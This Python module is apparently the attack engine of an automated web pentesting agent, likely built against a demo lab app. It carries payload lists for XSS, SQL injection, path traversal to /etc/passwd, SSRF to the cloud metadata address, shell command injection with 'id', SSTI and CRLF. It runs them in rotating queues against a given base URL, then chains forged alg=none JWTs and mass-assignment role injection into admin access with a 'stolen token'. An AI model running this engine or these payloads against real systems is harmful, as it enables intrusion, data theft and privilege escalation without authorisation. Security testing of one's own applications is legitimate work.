"""Adaptive attack engine — multiple techniques, escalation, chains.

Not a fixed skill checklist: tries different payloads and approaches
based on recon, stops when a category is confirmed, chains follow-ups.
"""

from __future__ import annotations

import json
import re
import urllib.request
from dataclasses import dataclass, field

from tools.auth_skills import craft_none_jwt, probe_jwt, probe_mass_assignment
from tools.http import web_base
from tools.probe_http import fetch_get
from tools.skills import PROBE_HANDLERS

# technique -> list of (name, payload, note)
APPROACHES: dict[str, list[tuple[str, str, str]]] = {
    "xss": [
        ("script_block", "<script>alert(1)</script>", "classic reflected script"),
        ("img_onerror", '<img src=x onerror=alert(1)>', "event handler without script tags"),
        ("svg_onload", '"><svg/onload=alert(1)>', "attribute breakout into SVG"),
        ("details_open", "<details open ontoggle=alert(1)>", "alternative HTML tag vector"),
    ],
    "sqli": [
        ("tautology", "' OR '1'='1", "boolean tautology — extra rows"),
        ("error_quote", "'", "single quote — error-based signal"),
        ("comment_bypass", "' OR 1=1--", "comment-terminated OR"),
        ("union_probe", "' UNION SELECT NULL--", "union column probe"),
    ],
    "idor": [
        ("adjacent_id", "2", "next sequential object ID"),
        ("zero_id", "0", "zero / unset ID edge case"),
        ("admin_literal", "admin", "string ID instead of numeric"),
        ("large_id", "9999", "out-of-range enumeration"),
    ],
    "redirect": [
        ("external_https", "https://evil.example/phish", "off-site HTTPS redirect"),
        ("protocol_relative", "//evil.example/", "protocol-relative bypass"),
        ("javascript_uri", "javascript:alert(document.domain)", "javascript: scheme"),
    ],
    "traversal": [
        ("etc_passwd", "../../../etc/passwd", "unix passwd via dot-dot"),
        ("windows_ini", "..\\..\\windows\\win.ini", "windows path variant"),
        ("encoded_dots", "..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal"),
    ],
    "ssrf": [
        ("ollama_internal", "http://127.0.0.1:11434/", "internal AI service"),
        ("self_health", "http://127.0.0.1:3000/health", "loopback same app"),
        ("metadata", "http://169.254.169.254/latest/meta-data/", "cloud metadata IP"),
        ("file_proto", "file:///etc/passwd", "file:// scheme probe"),
    ],
    "cmdi": [
        ("semicolon_id", "127.0.0.1;id", "semicolon command chaining"),
        ("pipe_id", "127.0.0.1|id", "pipe to shell"),
        ("backtick", "127.0.0.1`id`", "backtick execution"),
        ("and_id", "127.0.0.1&&id", "AND chained command"),
    ],
    "ssti": [
        ("math_expr", "{{7*7}}", "template math evaluation"),
        ("config_leak", "{{config}}", "config object leak probe"),
        ("string_builder", "${7*7}", "alternate template delimiter"),
    ],
    "crlf": [
        ("header_inject", "a%0d%0AX-Injected: evil", "CRLF into response headers"),
        ("set_cookie", "x%0d%0ASet-Cookie: evil=1", "cookie injection attempt"),
    ],
    "cors": [
        ("evil_origin", "https://evil.example", "untrusted origin reflection"),
        ("null_origin", "null", "null origin bypass attempt"),
    ],
}

SURFACE_MAP = {
    "/search": ("xss", "/search", "q"),
    "/user": ("sqli", "/user", "id"),
    "/redirect": ("redirect", "/redirect", "url"),
    "/files": ("traversal", "/files", "name"),
    "/fetch": ("ssrf", "/fetch", "url"),
    "/ping": ("cmdi", "/ping", "host"),
    "/render": ("ssti", "/render", "template"),
    "/echo": ("crlf", "/echo", "msg"),
    "/api/cors": ("cors", "/api/cors", "Origin"),
}

PROBE_FOR = {
    "xss": "probe_xss",
    "sqli": "probe_sqli",
    "idor": "probe_idor",
    "redirect": "probe_redirect",
    "traversal": "probe_traversal",
    "ssrf": "probe_ssrf",
    "cmdi": "probe_cmdi",
    "ssti": "probe_ssti",
    "crlf": "probe_crlf",
    "cors": "probe_cors",
}

SEVERITY = {
    "xss": "high", "sqli": "high", "ssrf": "high", "cmdi": "high", "ssti": "high",
    "idor": "medium", "redirect": "medium", "traversal": "medium", "cors": "medium", "crlf": "medium",
    "jwt": "high", "mass_assignment": "high",
}


@dataclass
class AttackSurface:
    category: str
    path: str
    param: str
    source: str


@dataclass
class AttackAttempt:
    category: str
    technique: str
    path: str
    param: str
    payload: str
    note: str
    priority: int


@dataclass
class AttackResult:
    attempt: AttackAttempt
    output: str
    vulnerable: bool
    partial: bool
    signals: list[str] = field(default_factory=list)


@dataclass
class EngagementState:
    confirmed: dict[str, AttackResult] = field(default_factory=dict)
    partials: dict[str, list[AttackResult]] = field(default_factory=dict)
    attempts: list[AttackResult] = field(default_factory=list)
    chains: list[str] = field(default_factory=list)


def _parse_forms(base: str, path: str) -> list[tuple[str, str]]:
    data = fetch_get(base.rstrip("/") + path)
    body = data.get("body") or ""
    found = []
    for match in re.finditer(r"<form\b([^>]*)>(.*?)</form>", body, flags=re.I | re.S):
        attrs, inner = match.group(1), match.group(2)
        method = re.search(r'method=["\']([^"\']+)', attrs, flags=re.I)
        if method and method.group(1).strip().lower() not in {"", "get"}:
            continue
        action = re.search(r'action=["\']([^"\']*)', attrs, flags=re.I)
        action_path = (action.group(1) if action else path).split("?", 1)[0] or path
        if not action_path.startswith("/"):
            action_path = "/" + action_path
        for inp in re.finditer(r"<input\b([^>]*)>", inner, flags=re.I):
            tag = inp.group(1)
            itype = re.search(r'type=["\']([^"\']+)', tag, flags=re.I)
            if itype and itype.group(1).lower() in {"submit", "button", "hidden", "image", "file"}:
                continue
            name = re.search(r'name=["\']([^"\']+)', tag, flags=re.I)
            if name:
                found.append((action_path, name.group(1)))
    return found


def discover_surfaces(base: str, live_paths: set[str]) -> list[AttackSurface]:
    surfaces: list[AttackSurface] = []
    seen: set[tuple[str, str, str]] = set()

    def add(cat: str, path: str, param: str, source: str) -> None:
        key = (cat, path.split("?", 1)[0], param)
        if key in seen:
            return
        seen.add(key)
        surfaces.append(AttackSurface(cat, path.split("?", 1)[0], param, source))

    for path in live_paths:
        for fragment, (cat, default_path, default_param) in SURFACE_MAP.items():
            if fragment in path:
                add(cat, default_path, default_param, f"live path {path}")
                if cat == "sqli" and fragment == "/user":
                    add("idor", default_path, default_param, "same user endpoint — IDOR angle")

    for path in live_paths:
        if not path.endswith(".html") and path not in {"/search", "/"}:
            continue
        for action_path, param in _parse_forms(base, path):
            add("xss", action_path, param, f"GET form on {path}")

    return surfaces


def build_attack_queue(surfaces: list[AttackSurface], cycle: int) -> list[AttackAttempt]:
    queue: list[AttackAttempt] = []
    for surface in surfaces:
        approaches = APPROACHES.get(surface.category, [])
        if not approaches:
            continue
        start = (cycle - 1) % len(approaches)
        rotated = approaches[start:] + approaches[:start]
        for idx, (technique, payload, note) in enumerate(rotated):
            queue.append(AttackAttempt(
                category=surface.category,
                technique=technique,
                path=surface.path,
                param=surface.param,
                payload=payload,
                note=f"{note} ({surface.source})",
                priority=idx,
            ))
    queue.sort(key=lambda a: (a.category, a.priority))
    return queue


def _parse_result(output: str) -> tuple[bool, bool, list[str]]:
    vulnerable = "vulnerable: True" in output
    partial = False
    signals = []
    for line in output.splitlines():
        if line.startswith("signals:"):
            signals.append(line.split(":", 1)[1].strip())
        if "reflected" in line.lower() and "not reflected" not in line.lower():
            if not vulnerable:
                partial = True
        if "error pattern" in line.lower() or "html-encoded" in line.lower():
            partial = True
    if signals and not vulnerable:
        partial = True
    return vulnerable, partial, signals


def _run_probe(attempt: AttackAttempt, base: str) -> str:
    tool = PROBE_FOR.get(attempt.category)
    if not tool or tool not in PROBE_HANDLERS:
        return f"error: no probe for {attempt.category}"
    handler = PROBE_HANDLERS[tool]
    if attempt.category == "cors":
        return handler(base, attempt.payload, attempt.path, attempt.param)
    return handler(base, attempt.path, attempt.param, attempt.payload)


def run_attack_queue(
    base: str,
    queue: list[AttackAttempt],
    log_fn=print,
) -> tuple[list[AttackResult], EngagementState]:
    state = EngagementState()
    lines = []

    for attempt in queue:
        if attempt.category in state.confirmed:
            log_fn(f"  skip {attempt.technique} — {attempt.category} already confirmed")
            continue

        log_fn(
            f"[attack] {attempt.category}/{attempt.technique} "
            f"GET {attempt.path}?{attempt.param}=... — {attempt.note}"
        )
        try:
            output = _run_probe(attempt, base)
        except Exception as exc:
            output = f"error: {exc}"

        vuln, partial, signals = _parse_result(output)
        result = AttackResult(attempt, output, vuln, partial, signals)
        state.attempts.append(result)
        lines.append(f"=== {attempt.category}/{attempt.technique} ===")
        lines.append(f"payload: {attempt.payload[:120]}")
        lines.append(output)
        lines.append("")

        if vuln:
            state.confirmed[attempt.category] = result
            log_fn(f"  [+] CONFIRMED {attempt.category} via {attempt.technique}")
        elif partial:
            state.partials.setdefault(attempt.category, []).append(result)
            log_fn(f"  [~] partial signal on {attempt.category}/{attempt.technique} — keep trying")
        else:
            log_fn(f"  [-] no hit — next approach")

    return lines, state


def run_auth_chains(base: str, auth: dict, log_fn=print) -> tuple[list[str], EngagementState]:
    """Multi-step auth attacks — not single-shot checks."""
    state = EngagementState()
    lines = []
    auth_cfg = auth or {"username": "demo", "password": "demo"}

    jwt_variants = [
        ("none_demo_admin", craft_none_jwt("demo", "admin"), "alg=none with admin role"),
        ("none_admin_admin", craft_none_jwt("admin", "admin"), "alg=none as admin user"),
    ]
    for name, token, note in jwt_variants:
        log_fn(f"[chain] jwt/{name} — {note}")
        out = probe_jwt(base, token)
        vuln, partial, signals = _parse_result(out)
        att = AttackAttempt("jwt", name, "/api/admin", "Authorization", token, note, 0)
        res = AttackResult(att, out, vuln, partial, signals)
        state.attempts.append(res)
        lines.extend([f"=== jwt chain: {name} ===", out, ""])
        if vuln:
            state.confirmed["jwt"] = res
            log_fn(f"  [+] jwt bypass via {name}")
            break

    mass_bodies = [
        ('{"username":"demo","password":"demo","role":"admin"}', "role field injection"),
        ('{"username":"demo","password":"demo","isAdmin":true}', "boolean privilege field"),
        ('{"username":"admin","password":"demo","role":"admin"}', "username swap with role"),
    ]
    for body, note in mass_bodies:
        if state.confirmed.get("mass_assignment"):
            break
        log_fn(f"[chain] mass_assignment — {note}")
        out = probe_mass_assignment(base, body)
        vuln, partial, signals = _parse_result(out)
        att = AttackAttempt("mass_assignment", note[:20], "/api/login", "body", body, note, 0)
        res = AttackResult(att, out, vuln, partial, signals)
        state.attempts.append(res)
        lines.extend([f"=== mass assignment: {note} ===", out, ""])
        if vuln:
            state.confirmed["mass_assignment"] = res
            state.chains.append("mass_assignment -> retry admin API with issued token")
            log_fn(f"  [+] mass assignment worked — {note}")
            m = re.search(r'"token"\s*:\s*"([^"]+)"', out)
            if m:
                token = m.group(1)
                log_fn("[chain] follow-up: admin API with mass-assignment token")
                follow = probe_jwt(base, token)
                lines.extend(["=== chain follow-up: admin with stolen token ===", follow, ""])
                if "vulnerable: True" in follow or "admin panel key" in follow:
                    state.chains.append("confirmed admin access with escalated token")
                    log_fn("  [+] chained admin access confirmed")

    if not state.confirmed.get("jwt") and auth_cfg:
        log_fn("[chain] baseline login then profile enum")
        from tools.playbook import check_auth_flow
        out = check_auth_flow(base, auth_cfg.get("username", "demo"), auth_cfg.get("password", "demo"))
        lines.extend(["=== auth flow baseline ===", out, ""])
        if "profile accessible with token" in out:
            state.chains.append("valid login works — privilege escalation still open")

    return lines, state


def confirmed_findings(state: EngagementState) -> list[dict]:
    findings = []
    for cat, res in state.confirmed.items():
        findings.append({
            "category": cat,
            "technique": res.attempt.technique,
            "severity": SEVERITY.get(cat, "medium"),
            "path": res.attempt.path,
            "param": res.attempt.param,
            "payload": res.attempt.payload[:120],
            "note": res.attempt.note,
            "signals": res.signals,
        })
    return findings
